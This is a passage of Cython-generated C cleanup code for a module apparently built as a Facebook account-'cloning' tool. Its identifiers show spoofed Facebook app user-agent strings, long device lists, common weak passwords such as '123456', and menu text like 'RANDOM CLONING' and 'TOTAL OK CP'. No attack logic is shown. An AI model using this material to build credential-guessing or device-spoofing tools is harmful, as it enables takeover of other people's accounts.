  Py_CLEAR(clear_module_state->__pyx_ptype_5kiron___pyx_scope_struct_4_genexpr);
  Py_CLEAR(clear_module_state->__pyx_type_5kiron___pyx_scope_struct_4_genexpr);
  Py_CLEAR(clear_module_state->__pyx_kp_s_0);
  Py_CLEAR(clear_module_state->__pyx_kp_u_0);
  Py_CLEAR(clear_module_state->__pyx_kp_u_00);
  Py_CLEAR(clear_module_state->__pyx_kp_s_01);
  Py_CLEAR(clear_module_state->__pyx_kp_u_011_en_us_AppleWebKit_537_36);
  Py_CLEAR(clear_module_state->__pyx_kp_s_02);
  Py_CLEAR(clear_module_state->__pyx_kp_s_03);
  Py_CLEAR(clear_module_state->__pyx_kp_s_04);
  Py_CLEAR(clear_module_state->__pyx_kp_s_05);
  Py_CLEAR(clear_module_state->__pyx_kp_s_06);
  Py_CLEAR(clear_module_state->__pyx_kp_s_07);
  Py_CLEAR(clear_module_state->__pyx_kp_s_08);
  Py_CLEAR(clear_module_state->__pyx_kp_s_09);
  Py_CLEAR(clear_module_state->__pyx_kp_s_0_0);
  Py_CLEAR(clear_module_state->__pyx_kp_u_0_0);
  Py_CLEAR(clear_module_state->__pyx_kp_s_0_1);
  Py_CLEAR(clear_module_state->__pyx_kp_s_0_2);
  Py_CLEAR(clear_module_state->__pyx_kp_u_0_3);
  Py_CLEAR(clear_module_state->__pyx_kp_u_0_38_5_244m_38_5_46m_EXIT_TOOL);
  Py_CLEAR(clear_module_state->__pyx_kp_u_0_Safari_534);
  Py_CLEAR(clear_module_state->__pyx_kp_u_0_Safari_537_36);
  Py_CLEAR(clear_module_state->__pyx_kp_u_0_Win64_x64_AppleWebKit_537_36);
  Py_CLEAR(clear_module_state->__pyx_kp_s_1);
  Py_CLEAR(clear_module_state->__pyx_kp_s_10);
  Py_CLEAR(clear_module_state->__pyx_kp_s_10000);
  Py_CLEAR(clear_module_state->__pyx_kp_s_100000);
  Py_CLEAR(clear_module_state->__pyx_kp_s_102030);
  Py_CLEAR(clear_module_state->__pyx_kp_u_10_1_YaSearchBrowser);
  Py_CLEAR(clear_module_state->__pyx_kp_s_11);
  Py_CLEAR(clear_module_state->__pyx_kp_s_112233);
  Py_CLEAR(clear_module_state->__pyx_kp_s_12);
  Py_CLEAR(clear_module_state->__pyx_kp_s_123123);
  Py_CLEAR(clear_module_state->__pyx_kp_s_123456);
  Py_CLEAR(clear_module_state->__pyx_kp_s_1234567);
  Py_CLEAR(clear_module_state->__pyx_kp_s_12345678);
  Py_CLEAR(clear_module_state->__pyx_kp_s_123456789);
  Py_CLEAR(clear_module_state->__pyx_kp_s_1234567890);
  Py_CLEAR(clear_module_state->__pyx_kp_u_136_Mobile_Safari);
  Py_CLEAR(clear_module_state->__pyx_kp_s_13_Pro);
  Py_CLEAR(clear_module_state->__pyx_kp_u_1_0);
  Py_CLEAR(clear_module_state->__pyx_kp_s_1_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_1_33m);
  Py_CLEAR(clear_module_state->__pyx_kp_s_1_34m);
  Py_CLEAR(clear_module_state->__pyx_kp_s_1_34m_1_34m_38_5_244m_38_5_46m);
  Py_CLEAR(clear_module_state->__pyx_kp_s_1_37m);
  Py_CLEAR(clear_module_state->__pyx_kp_u_1_38_5_244m_38_5_46m_FILE_CLONIN);
  Py_CLEAR(clear_module_state->__pyx_kp_u_1_38_5_244m_38_5_46m_METHOD_38_5);
  Py_CLEAR(clear_module_state->__pyx_kp_s_1_96m);
  Py_CLEAR(clear_module_state->__pyx_kp_s_1_97m);
  Py_CLEAR(clear_module_state->__pyx_kp_s_1_97m_1_37m);
  Py_CLEAR(clear_module_state->__pyx_kp_u_1_97m_1_37m);
  Py_CLEAR(clear_module_state->__pyx_kp_u_1_97m_1_37m_2);
  Py_CLEAR(clear_module_state->__pyx_kp_u_1_97m_1_91m_1_92m_1_93m_38_5_46);
  Py_CLEAR(clear_module_state->__pyx_kp_u_1_97m_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_1_97m_38_5_244m_1_97m_38_5_244m);
  Py_CLEAR(clear_module_state->__pyx_kp_u_1_BroPP_1_0_SA_3_Mobile_Safari);
  Py_CLEAR(clear_module_state->__pyx_kp_u_1_en_US_AppleWebKit_534);
  Py_CLEAR(clear_module_state->__pyx_kp_s_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_203040);
  Py_CLEAR(clear_module_state->__pyx_kp_s_210);
  Py_CLEAR(clear_module_state->__pyx_kp_u_25);
  Py_CLEAR(clear_module_state->__pyx_kp_s_28);
  Py_CLEAR(clear_module_state->__pyx_kp_s_29);
  Py_CLEAR(clear_module_state->__pyx_kp_u_2_38_5_244m_38_5_46m_METHOD_38_5);
  Py_CLEAR(clear_module_state->__pyx_kp_u_2_38_5_244m_38_5_46m_RANDOM_CLON);
  Py_CLEAR(clear_module_state->__pyx_kp_s_2_AYYUB);
  Py_CLEAR(clear_module_state->__pyx_kp_s_3);
  Py_CLEAR(clear_module_state->__pyx_kp_s_350685531728_62f8ce9f74b12f84c12);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_121m);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_122m);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_123m);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_14m);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_196m);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_205m);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_244m_1_97m0_38_5_244m_38_5);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_1_97m1_38_5_244m_38_5);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_244m_1_97m1_38_5_244m_38_5_2);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_10);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_11);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_12);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_13);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_14);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_15);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_16);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_17);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_18);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_244m_1_97m_38_5_244m_38_5_19);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_2);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_3);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_4);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_5);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_6);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_7);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_8);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_244m_1_97m_38_5_244m_38_5_9);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_2);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_3);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_244mAYYUB_OK_38);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_244m_38_5_46m_38);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_244m_38_5_46m_38_2);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46mAYYUB_38_5_24);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46mAYYUB_OK_38_5);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46mAYYUB_OK_38_5_2);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46mAYYUB_XD_38_5);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46mOK_1_37m_38_5);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_2);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_3);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_38_5_244m);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_38_5_244m_38);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_244m_38_5_46m_38_5_244m_38_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_244m_38_5_46m_38_5_244m_38_3);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_244m_38_5_46m_38_5_244m_38_4);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_4);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_5);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_6);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_7);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_244m_38_5_46m_8);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_CHOICE);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_DO_YOU_WENT);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_EXAMPLE_sdca);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_EXIT_DONE);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_FILE_LOCATIO);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_FILE_NAME);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_IF_NO_RESULT);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_NO_INTERNET);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_OPTION_NOT_F);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_PASSWORD_LIM);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_PASSWORD_NO);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_PASS_38_5_24);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_PRESS_ENTER);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_THE_PROCESS);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_TOTAL_ACCOUN);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_38_5_46m_TOTAL_OK_CP);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_4);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_244m_5);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_244m_KEY_IS_NOT_APPROVED);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_46m);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_47m);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_48m);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_49m);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_50m);
  Py_CLEAR(clear_module_state->__pyx_kp_u_38_5_81mCP_1_37m_38_5_81m);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_86m);
  Py_CLEAR(clear_module_state->__pyx_kp_s_38_5_8m);
  Py_CLEAR(clear_module_state->__pyx_kp_u_3_38_5_244m_38_5_46m_OLD_CLONING);
  Py_CLEAR(clear_module_state->__pyx_kp_s_4);
  Py_CLEAR(clear_module_state->__pyx_kp_s_4YYU8);
  Py_CLEAR(clear_module_state->__pyx_kp_s_5);
  Py_CLEAR(clear_module_state->__pyx_kp_u_5);
  Py_CLEAR(clear_module_state->__pyx_kp_u_537_36_Puffin_9_7_2);
  Py_CLEAR(clear_module_state->__pyx_kp_u_59);
  Py_CLEAR(clear_module_state->__pyx_kp_s_6);
  Py_CLEAR(clear_module_state->__pyx_kp_s_7);
  Py_CLEAR(clear_module_state->__pyx_kp_s_708090);
  Py_CLEAR(clear_module_state->__pyx_kp_s_8);
  Py_CLEAR(clear_module_state->__pyx_kp_s_9);
  Py_CLEAR(clear_module_state->__pyx_kp_s_980);
  Py_CLEAR(clear_module_state->__pyx_n_s_A);
  Py_CLEAR(clear_module_state->__pyx_n_s_A525FXXU3AUG4);
  Py_CLEAR(clear_module_state->__pyx_n_s_A715FXXU3ATI8);
  Py_CLEAR(clear_module_state->__pyx_n_s_AM);
  Py_CLEAR(clear_module_state->__pyx_n_u_AP);
  Py_CLEAR(clear_module_state->__pyx_kp_u_AYYUB_CP_38_5_244m);
  Py_CLEAR(clear_module_state->__pyx_n_s_AYYUB_M1);
  Py_CLEAR(clear_module_state->__pyx_n_s_AYYUB_M2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Accept_Encoding);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Android);
  Py_CLEAR(clear_module_state->__pyx_kp_u_AppleWebKit);
  Py_CLEAR(clear_module_state->__pyx_kp_u_AppleWebKit_534_30_KHTML_like_G);
  Py_CLEAR(clear_module_state->__pyx_kp_u_AppleWebKit_537_36_KHTML_like_G);
  Py_CLEAR(clear_module_state->__pyx_kp_s_AppleWebKit_537_36_KHTML_like_G_2);
  Py_CLEAR(clear_module_state->__pyx_kp_u_AppleWebKit_537_36_KHTML_like_G_3);
  Py_CLEAR(clear_module_state->__pyx_n_s_April);
  Py_CLEAR(clear_module_state->__pyx_n_s_August);
  Py_CLEAR(clear_module_state->__pyx_n_s_Authorization);
  Py_CLEAR(clear_module_state->__pyx_n_s_B);
  Py_CLEAR(clear_module_state->__pyx_n_s_BD);
  Py_CLEAR(clear_module_state->__pyx_n_s_BD_locals_genexpr);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Black_Shark);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Black_Shark_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Black_Shark_3);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Black_Shark_3S);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Black_Shark_4);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Black_Shark_4_Pro);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Black_Shark_5);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Black_Shark_5_Pro);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Black_Shark_Helo);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Build);
  Py_CLEAR(clear_module_state->__pyx_kp_u_Build);
  Py_CLEAR(clear_module_state->__pyx_kp_u_Build_PPR1);
  Py_CLEAR(clear_module_state->__pyx_n_s_C);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH1801);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH1803);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH1805);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH1809);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH1827);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH1837);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH1851);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH1853);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH1979);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH1983);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH1987);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH2005);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH2009);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH2015);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH2059);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH2061);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH2065);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH2069);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH2071);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH2073);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH2077);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH2091);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH2095);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH2099);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH2137);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH2139);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH2145);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH2161);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH2185);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH2201);
  Py_CLEAR(clear_module_state->__pyx_n_s_CPH2209);
  Py_CLEAR(clear_module_state->__pyx_kp_u_Chrome);
  Py_CLEAR(clear_module_state->__pyx_n_s_Civi);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Civi_2);
  Py_CLEAR(clear_module_state->__pyx_n_s_ConnectionError);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Content_Type);
  Py_CLEAR(clear_module_state->__pyx_n_s_D);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Davik_2_1_0_Linux_U_Android);
  Py_CLEAR(clear_module_state->__pyx_n_s_December);
  Py_CLEAR(clear_module_state->__pyx_n_s_Devember);
  Py_CLEAR(clear_module_state->__pyx_n_s_EPE54B);
  Py_CLEAR(clear_module_state->__pyx_n_s_EX);
  Py_CLEAR(clear_module_state->__pyx_n_s_EXCELLENT);
  Py_CLEAR(clear_module_state->__pyx_n_s_F916BXXU1BTKF);
  Py_CLEAR(clear_module_state->__pyx_n_s_FB4A);
  Py_CLEAR(clear_module_state->__pyx_kp_s_FBAN);
  Py_CLEAR(clear_module_state->__pyx_kp_s_FBAN_FB4A_FBAV);
  Py_CLEAR(clear_module_state->__pyx_kp_s_FBAN_FB4A_FBAV_59_0_0_15_313_FB);
  Py_CLEAR(clear_module_state->__pyx_kp_s_FBAN_FB4A_FBAV_59_0_0_15_313_FB_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_FBAV);
  Py_CLEAR(clear_module_state->__pyx_kp_s_FBBD);
  Py_CLEAR(clear_module_state->__pyx_kp_s_FBBV);
  Py_CLEAR(clear_module_state->__pyx_kp_s_FBCR);
  Py_CLEAR(clear_module_state->__pyx_kp_s_FBDM_density_2_625_width_1080_h);
  Py_CLEAR(clear_module_state->__pyx_kp_s_FBDV);
  Py_CLEAR(clear_module_state->__pyx_kp_s_FBMF);
  Py_CLEAR(clear_module_state->__pyx_kp_s_FBOP_19_FBCA);
  Py_CLEAR(clear_module_state->__pyx_kp_s_FBPN);
  Py_CLEAR(clear_module_state->__pyx_kp_s_FBRV);
  Py_CLEAR(clear_module_state->__pyx_kp_s_FBSV);
  Py_CLEAR(clear_module_state->__pyx_n_s_February);
  Py_CLEAR(clear_module_state->__pyx_n_s_FileNotFoundError);
  Py_CLEAR(clear_module_state->__pyx_n_s_First);
  Py_CLEAR(clear_module_state->__pyx_n_s_G);
  Py_CLEAR(clear_module_state->__pyx_n_s_G1);
  Py_CLEAR(clear_module_state->__pyx_n_s_G2);
  Py_CLEAR(clear_module_state->__pyx_n_s_G3);
  Py_CLEAR(clear_module_state->__pyx_n_s_G4);
  Py_CLEAR(clear_module_state->__pyx_n_s_G5);
  Py_CLEAR(clear_module_state->__pyx_n_s_G950FXXS5DSF1);
  Py_CLEAR(clear_module_state->__pyx_n_s_G950FXXS6DTA1);
  Py_CLEAR(clear_module_state->__pyx_n_s_G950FXXS8DTC6);
  Py_CLEAR(clear_module_state->__pyx_n_s_G950FXXU3CRGH);
  Py_CLEAR(clear_module_state->__pyx_n_s_G950FXXU4DSBA);
  Py_CLEAR(clear_module_state->__pyx_n_s_G975USQU4ETG1);
  Py_CLEAR(clear_module_state->__pyx_n_s_G985FXXU7DTJ2);
  Py_CLEAR(clear_module_state->__pyx_n_s_G998USQU1ATCU);
  Py_CLEAR(clear_module_state->__pyx_n_s_GET);
  Py_CLEAR(clear_module_state->__pyx_kp_s_GT_I9190);
  Py_CLEAR(clear_module_state->__pyx_kp_s_GT_I9192);
  Py_CLEAR(clear_module_state->__pyx_kp_s_GT_I9300);
  Py_CLEAR(clear_module_state->__pyx_kp_s_GT_I9300I);
  Py_CLEAR(clear_module_state->__pyx_kp_s_GT_I9301I);
  Py_CLEAR(clear_module_state->__pyx_kp_s_GT_I9500);
  Py_CLEAR(clear_module_state->__pyx_kp_s_GT_N5100);
  Py_CLEAR(clear_module_state->__pyx_kp_s_GT_N7100);
  Py_CLEAR(clear_module_state->__pyx_kp_s_GT_N8000);
  Py_CLEAR(clear_module_state->__pyx_kp_s_GT_P3110);
  Py_CLEAR(clear_module_state->__pyx_kp_s_GT_P5100);
  Py_CLEAR(clear_module_state->__pyx_kp_s_GT_P5110);
  Py_CLEAR(clear_module_state->__pyx_kp_s_GT_P5200);
  Py_CLEAR(clear_module_state->__pyx_kp_s_GT_P5210);
  Py_CLEAR(clear_module_state->__pyx_kp_s_GT_P5220);
  Py_CLEAR(clear_module_state->__pyx_kp_s_GT_S7390);
  Py_CLEAR(clear_module_state->__pyx_n_s_HLK75C);
  Py_CLEAR(clear_module_state->__pyx_n_s_HLK75F);
  Py_CLEAR(clear_module_state->__pyx_n_s_HLK75H);
  Py_CLEAR(clear_module_state->__pyx_n_s_HRI83);
  Py_CLEAR(clear_module_state->__pyx_n_s_Hongmi);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Hongmi_1S);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Hongmi_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Hongmi_2_3G);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Hongmi_2_4G);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Hongmi_4G);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Hongmi_Note_1TD);
  Py_CLEAR(clear_module_state->__pyx_n_s_IML74K);
  Py_CLEAR(clear_module_state->__pyx_n_s_IMM76D);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Installing_missing_modules);
  Py_CLEAR(clear_module_state->__pyx_n_s_JDQ);
  Py_CLEAR(clear_module_state->__pyx_n_s_JDQ39);
  Py_CLEAR(clear_module_state->__pyx_n_s_JSS15J);
  Py_CLEAR(clear_module_state->__pyx_n_s_JWR66L);
  Py_CLEAR(clear_module_state->__pyx_n_s_JZO54K);
  Py_CLEAR(clear_module_state->__pyx_n_s_January);
  Py_CLEAR(clear_module_state->__pyx_n_s_July);
  Py_CLEAR(clear_module_state->__pyx_n_s_June);
  Py_CLEAR(clear_module_state->__pyx_kp_u_KHTML_like_Gecko_Chrome);
  Py_CLEAR(clear_module_state->__pyx_kp_u_KHTML_like_Gecko_UCBrowser_79_0);
  Py_CLEAR(clear_module_state->__pyx_kp_u_KHTML_like_Gecko_Version);
  Py_CLEAR(clear_module_state->__pyx_n_s_KOT4);
  Py_CLEAR(clear_module_state->__pyx_n_s_KOT49H);
  Py_CLEAR(clear_module_state->__pyx_n_s_KTU84P);
  Py_CLEAR(clear_module_state->__pyx_n_s_LMY4);
  Py_CLEAR(clear_module_state->__pyx_n_s_LMY47V);
  Py_CLEAR(clear_module_state->__pyx_n_s_LMY48G);
  Py_CLEAR(clear_module_state->__pyx_n_s_LMY48J);
  Py_CLEAR(clear_module_state->__pyx_n_s_LRX22C);
  Py_CLEAR(clear_module_state->__pyx_n_s_LRX22G);
  Py_CLEAR(clear_module_state->__pyx_kp_s_LRX22G_2);
  Py_CLEAR(clear_module_state->__pyx_n_s_Last);
  Py_CLEAR(clear_module_state->__pyx_n_s_Liger);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Log_In);
  Py_CLEAR(clear_module_state->__pyx_n_s_M);
  Py_CLEAR(clear_module_state->__pyx_n_u_M);
  Py_CLEAR(clear_module_state->__pyx_n_s_M1);
  Py_CLEAR(clear_module_state->__pyx_kp_u_M1_38_5_244m_38_5_244m);
  Py_CLEAR(clear_module_state->__pyx_kp_u_M2_38_5_244m);
  Py_CLEAR(clear_module_state->__pyx_n_s_M3);
  Py_CLEAR(clear_module_state->__pyx_n_s_M3s);
  Py_CLEAR(clear_module_state->__pyx_kp_s_M5_Lite);
  Py_CLEAR(clear_module_state->__pyx_kp_s_M6_Note);
  Py_CLEAR(clear_module_state->__pyx_n_s_MB526);
  Py_CLEAR(clear_module_state->__pyx_n_s_MDB08M);
  Py_CLEAR(clear_module_state->__pyx_kp_s_MI_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_MI_3W);
  Py_CLEAR(clear_module_state->__pyx_kp_s_MI_4i);
  Py_CLEAR(clear_module_state->__pyx_kp_s_MI_5);
  Py_CLEAR(clear_module_state->__pyx_kp_s_MI_5X);
  Py_CLEAR(clear_module_state->__pyx_n_s_MMB29K);
  Py_CLEAR(clear_module_state->__pyx_n_s_MMB29M);
  Py_CLEAR(clear_module_state->__pyx_n_s_MMB29U);
  Py_CLEAR(clear_module_state->__pyx_kp_s_MT6765_G_Series);
  Py_CLEAR(clear_module_state->__pyx_n_s_MX2);
  Py_CLEAR(clear_module_state->__pyx_n_s_MX380);
  Py_CLEAR(clear_module_state->__pyx_n_s_MX5);
  Py_CLEAR(clear_module_state->__pyx_kp_s_M_Bot_54);
  Py_CLEAR(clear_module_state->__pyx_kp_s_M_Bot_60);
  Py_CLEAR(clear_module_state->__pyx_n_s_Magic);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Maimang_5);
  Py_CLEAR(clear_module_state->__pyx_n_s_March);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mate_10_Lite_Dual_SIM);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mate_20_X_China);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mate_8);
  Py_CLEAR(clear_module_state->__pyx_n_s_May);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Medias_X);
  Py_CLEAR(clear_module_state->__pyx_n_s_Mi5);
  Py_CLEAR(clear_module_state->__pyx_kp_s_MiTV_4A);
  Py_CLEAR(clear_module_state->__pyx_kp_s_MiTV_4A_Pro);
  Py_CLEAR(clear_module_state->__pyx_kp_s_MiTV_4C);
  Py_CLEAR(clear_module_state->__pyx_kp_s_MiTV_4I);
  Py_CLEAR(clear_module_state->__pyx_kp_s_MiTV_4S);
  Py_CLEAR(clear_module_state->__pyx_kp_s_MiTV_4X);
  Py_CLEAR(clear_module_state->__pyx_kp_s_MiTV_P1);
  Py_CLEAR(clear_module_state->__pyx_kp_s_MiTV_Q1);
  Py_CLEAR(clear_module_state->__pyx_kp_s_MiTV_Stick);
  Py_CLEAR(clear_module_state->__pyx_kp_s_MiTV_Stick_4K);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_4_LTE);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_A1);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Box_4);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_CC9);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_CC_9);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_CC_9_Pro);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_CC_9e);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Cancro);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Laser_Projector_150);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_MAX2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Max);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Max3);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Max_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Max_3);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Mix);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Mix_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Mix_2S);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Mix_3);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Mix_3_5G);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Mix_4);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Mix_Fold);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Note10);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Note5);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Note_10);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Note_10_Lite);
